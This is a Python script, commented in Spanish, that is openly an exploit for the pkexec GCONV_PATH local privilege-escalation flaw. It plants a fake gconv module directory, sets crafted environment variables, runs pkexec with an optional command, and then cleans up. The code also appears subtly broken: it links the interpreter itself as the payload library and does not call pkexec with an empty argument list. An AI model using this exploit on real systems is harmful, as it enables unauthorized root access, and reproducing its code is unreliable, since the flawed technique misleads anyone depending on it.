#!/usr/bin/env python3 
#_*_ coding: utf8 _*_
import os
import sys
import subprocess
import shutil

def rmrf(path):
    """Elimina recursivamente un directorio y su contenido."""
    if os.path.exists(path):
        shutil.rmtree(path, ignore_errors=True)

def create_exploit_environment():
    """Crea el entorno necesario para el exploit."""
    try:
        print("[DEBUG] Creando entorno de exploit...")
        os.makedirs("GCONV_PATH=.", exist_ok=True)
        os.makedirs(".exploit", exist_ok=True)

        with open(".exploit/gconv-modules", "w") as fp:
            fp.write("module UTF-8// PKEXEC// pkexec 2")
        print("[DEBUG] Archivo .exploit/gconv-modules creado.")

        exe_path = os.readlink("/proc/self/exe")
        os.symlink(exe_path, ".exploit/exploit.so")
        print(f"[DEBUG] Enlace simbólico creado desde {exe_path} a .exploit/exploit.so")
    except Exception as e:
        print(f"[DEBUG] Error al crear el entorno de exploit: {e}")
        cleanup_exploit_environment()

def cleanup_exploit_environment():
    """Limpia el entorno creado para el exploit."""
    print("[DEBUG] Limpiando el entorno de exploit...")
    rmrf("GCONV_PATH=.")
    rmrf(".exploit")

def execute_exploit(cmd=None):
    """Ejecuta el exploit."""
    create_exploit_environment()
    
    env = os.environ.copy()
    env.update({
        "GCONV_PATH": ".",
        "PATH": "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
        "CHARSET": "pkexec",
        "SHELL": "pkexec"
    })
    
    if cmd:
        env["CMD"] = cmd

    print("[DEBUG] Variables de entorno configuradas:")
    for k, v in env.items():
        if "GCONV" in k or "CHARSET" in k or "SHELL" in k or "CMD" in k:
            print(f"[DEBUG] {k}={v}")

    try:
        print("[DEBUG] Ejecutando pkexec...")
        result = subprocess.run(
            ["/usr/bin/pkexec"], 
            env=env, 
            capture_output=True, 
            text=True
        )
        print("[DEBUG] Salida de pkexec:")
        print(result.stdout)
        print(result.stderr)
        
        # Check if exploit failed
        if "pkexec --version" in result.stderr or "Exploit failed" in result.stderr:
            print("[DEBUG] Exploit failed. Target is most likely patched.")
        else:
            print("[DEBUG] Exploit ejecutado con éxito.")
    except Exception as e:
        print(f"[DEBUG] Failed to execute exploit: {e}")
    finally:
        cleanup_exploit_environment()

def main():
    cmd = None
    os.system('which pkexec | xargs ls -l')
    if len(sys.argv) > 1:
        cmd = sys.argv[1]
    execute_exploit(cmd)

if __name__ == "__main__":
    main()
